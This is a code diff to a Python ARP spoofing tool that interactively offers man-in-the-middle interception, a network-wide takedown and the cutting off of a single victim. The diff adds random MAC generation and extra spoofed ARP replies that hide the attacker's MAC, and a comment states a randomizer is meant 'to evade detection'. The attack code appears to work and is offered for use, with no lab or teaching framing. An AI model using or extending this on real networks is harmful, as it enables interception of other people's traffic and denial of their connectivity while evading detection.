@@ -48,10 +48,21 @@ def initialize():
     attacker = Attacker([attackerIP, attackerMAC])
     return (network, attacker, victimList)
 
+#generate random MAC address
+def generateMAC(seed_value):
+    mac = ""
+    seed(seed_value)
+    for i in range(6):
+        char1 = hex(randint(0, 15))[2:] #remove 0x from the beginnign of the hex
+        char2 = hex(randint(0, 15))[2:]
+        mac += char1 + char2 + ":"
+    return mac[:-1] #remove trailing ":"
+
 # Press the green button in the gutter to run the script.
 if __name__ == '__main__':
     takedown=False
     specific=False
+    # seed(655)
     (network, attacker, victimsList) = initialize()
     Color.pl("{+} " + network.toString())
     Color.pl("{+} " + attacker.toString())
@@ -60,19 +71,19 @@ if __name__ == '__main__':
 
     # select type of attack
     while(True):
-        Color.pl("{?} What type of ARP attack do you want to perform? \n (Man-in-the-middle[1] or Take down the network![2] or Attack specific victim[3]?)")
+        Color.pl("{?} What type of ARP attack do you want to perform? \n {C}Man-in-the-middle[1] {W}or {O}Take down the network![2] {W}or {P}{D}Attack specific victim[3]?)")
         selection = input()
         routerIP=network.ip
         # attacking down the whole network by specifying a non existent MAC
         if selection.lower() == "2":
             takedown = True
             ip=network.broadcastIP
-            mac="fa:fa:65:5f:fa:fa" #random
+            mac=generateMAC(randint(0, 655)) #random
             break
         # attacking a specific target and not allowing it to connect to the internet by specifying a non existent MAC
         elif selection.lower()=="3":
             specific=True
-            mac="fa:fa:65:5f:fa:fa" #random
+            mac=generateMAC(randint(0, 655)) #random
             break
         # Man in the Middle needs handling that is done later
         elif selection.lower() == "1":
@@ -123,20 +134,24 @@ if __name__ == '__main__':
     Color.pl("{+} Processing :) ")
 
     '''
-        pdst is the ip of the target that we want to change its ARP table
-        psrc is the ip in the ARP table that we want to change its associated MAC address
-        hwsrc is the MAC address that we replace with in the ARP table, no value for it uses the MAC of the attacker
+    pdst is the ip of the target that we want to change its ARP table
+    psrc is the ip in the ARP table that we want to change its associated MAC address
+    hwsrc is the MAC address that we replace with in the ARP table, no value for it uses the MAC of the attacker
+
+    Every time we send an ARP message, we also send one to change the attacker IP and MAC in order to not have 
+    duplicate MAC in the ARP table 
     '''
 
     if (not takedown and not specific): #man in the middle needs to change ARP table for both router and target
-        arp_target = ARP(op=2, psrc=routerIP, pdst=ip)
+        arp_target_router = ARP(op=2, psrc=routerIP, pdst=ip)
+        arp_target_attacker = ARP(op=2, psrc=attacker.ip, pdst=ip, hwsrc=generateMAC(randint(0, 655)))
         arp_router = ARP(op=2, psrc=ip, pdst=routerIP)
         while 1:
-            send(arp_target)
+            send(arp_target_router)
+            send(arp_target_attacker)
             send(arp_router)
             time.sleep(1)
     else:
-        seed(655)
         counter=0
         while 1:
             #randomizer to evade detection
